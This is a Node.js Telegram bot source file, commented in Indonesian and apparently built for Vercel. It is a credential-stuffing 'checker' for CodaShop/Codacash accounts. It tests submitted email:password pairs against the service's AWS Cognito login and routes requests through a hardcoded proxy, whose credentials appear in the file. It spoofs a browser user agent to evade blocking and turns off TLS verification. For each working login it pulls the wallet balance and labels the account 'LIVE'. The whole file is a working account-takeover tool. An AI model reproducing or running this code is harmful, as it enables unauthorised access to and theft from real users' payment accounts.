// Paksa matikan verifikasi SSL secara global (Setara: CURLOPT_SSL_VERIFYPEER, false)
process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";

const { Telegraf } = require('telegraf');
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');

const bot = new Telegraf(process.env.BOT_TOKEN);

// Proxy bawaan kamu
const proxyAgent = new HttpsProxyAgent('http://djHOV4rvR19ogznQ:SMM9r2QbLkUDQLpK@geo.floppydata.com:10080');

bot.start((ctx) => {
  ctx.reply('Halo! RecnomPay CodaShop Checker siap.\n\nKetik: /codashop email:pass');
});

bot.command('codashop', async (ctx) => {
  const messageText = ctx.message.text;
  const args = messageText.split(' ');

  if (args.length < 2) return ctx.reply('❌ Format Salah!\nGunakan: /codashop username:password');

  // Bersihkan format (| atau ; jadi titik dua)
  const combo = args[1].replace(/[|;\s]/g, ':').split(':');
  if (combo.length < 2) return ctx.reply('❌ Format Salah!\nGunakan: /codashop username:password');

  const username = combo[0].trim();
  const password = combo[1].trim();

  const loadingMsg = await ctx.reply('⏳ <i>RecnomPay Checker sedang memproses...</i>', { parse_mode: 'HTML' });

  try {
    // Stringify paksa seperti json_encode di PHP
    const authPayload = JSON.stringify({
      AuthFlow: "USER_PASSWORD_AUTH",
      ClientId: "437f3u0sfh7h0av5rlrrjdtmsb",
      AuthParameters: { USERNAME: username, PASSWORD: password },
      ClientMetadata: { country_code: "ph", lang_code: "en" }
    });

    // 1. Hit API AWS (Meniru curl_exec secara sempurna)
    const authReq = await axios.post("https://cognito-idp.ap-southeast-1.amazonaws.com/", authPayload, {
      headers: {
        "x-amz-target": "AWSCognitoIdentityProviderService.InitiateAuth",
        "Content-Type": "application/x-amz-json-1.1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" // Bypass block
      },
      httpsAgent: proxyAgent,
      validateStatus: () => true, // PENTING: Mencegah axios crash saat respons 400/DIE
      timeout: 20000 // CURLOPT_TIMEOUT, 20
    });

    const resData = authReq.data;

    // Jika ada AuthenticationResult (LIVE)
    if (resData && resData.AuthenticationResult) {
      const idToken = resData.AuthenticationResult.IdToken;

      // 2. Hit API Wallet Codacash
      const walletReq = await axios.get("https://wallet-api.codacash.com/user/wallet", {
        headers: {
          "Authorization": idToken,
          "x-country-code": "608",
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        },
        httpsAgent: proxyAgent,
        validateStatus: () => true,
        timeout: 15000 // CURLOPT_TIMEOUT, 15
      });

      const wData = walletReq.data;
      const balance = (wData && wData.data && wData.data.balanceAmount) ? wData.data.balanceAmount : 0;

      await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, undefined,
        `✅ <b>LIVE ACCOUNT</b>\n━━━━━━━━━━━━━━━━━━\nAcc: <code>${username}:${password}</code>\nBalance: <b>${balance}</b>\n━━━━━━━━━━━━━━━━━━\n🤖 <i>RecnomPay Checker</i>`,
        { parse_mode: 'HTML' }
      );

    } else {
      // Jika salah password / DIE
      const msg = (resData && resData.__type) ? resData.__type.replace('Exception', '') : 'Invalid Credentials';
      
      await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, undefined,
        `❌ <b>DIE ACCOUNT</b>\n━━━━━━━━━━━━━━━━━━\nAcc: <code>${username}:${password}</code>\nMsg: ${msg}\n━━━━━━━━━━━━━━━━━━`,
        { parse_mode: 'HTML' }
      );
    }

  } catch (error) {
    // Blok ini hanya akan berjalan jika proxy mati total (RTO)
    await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, undefined,
      `⚠️ <b>PROXY ERROR / TIMEOUT</b>\n━━━━━━━━━━━━━━━━━━\nAcc: <code>${username}:${password}</code>\nMsg: Gagal terhubung ke proxy/server.\n━━━━━━━━━━━━━━━━━━`,
      { parse_mode: 'HTML' }
    );
  }
});

// Handler utama Vercel Serverless Function
module.exports = async (req, res) => {
  try {
    if (req.method === 'POST') {
      await bot.handleUpdate(req.body, res);
    } else {
      res.status(200).send('RecnomPay Bot berjalan dengan baik!');
    }
  } catch (error) {
    res.status(500).send('Terjadi kesalahan pada server');
  }
};
